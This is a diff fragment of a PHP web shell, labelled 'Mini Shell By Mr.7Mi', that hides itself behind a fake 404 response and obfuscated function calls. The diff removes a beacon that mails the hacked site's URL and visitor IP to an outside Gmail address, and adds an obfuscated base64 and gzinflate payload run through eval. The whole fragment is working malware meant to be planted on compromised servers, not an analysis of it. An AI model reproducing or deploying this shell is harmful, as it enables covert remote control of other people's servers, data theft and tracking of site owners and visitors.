@@ -67,17 +67,7 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
 			<?php  WC: ?>
 		</div>
-		<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
+		<?php $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d"; $Lix = "NsJQV5WkCs1A+5jG/uOU/Tf6W33rtJtg3P4avcy+btuc9XOYynq+kk84kjztzC4f4VCgggSsilkxdQf9ADshb2uVkrm6qXkxExSGkWHbmiovj5cEjBvozpjtC9cH/diDJj2w+wIP4TrLD+sXCSWS9Uk0Bthn4fsZ5ezdt21oQHaLaU9NMtWVYCgwVuATKWV+RtWG+e+cxbBDjyaKb8AtpTS99IMAwUWc6wowzo8e+QrEoIJGsfmbuj8Ns1xWzha1Z07GyviSnGZpnYTcaGXbN3KHURFmVJhp/XPXcbTsbrCtbdrL+SipJl3ZJLQ8MlqGcLg8mHZoHKpT+feOAfokT3tFzV6+/D2tkajmyom9Ii0idrmPgnvjMnqzjixwYz/NIVkLfs/BfXMFwI8adDZjcin/SHQLBwJe+fcA4Eg/CHQPB4fvBIUA"; eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto)))); exit; ?>
 		<?php  goto mR; Un: ?>
 		<table class="table table-hover table-bordered table-sm">
 			<thead class="text-light">
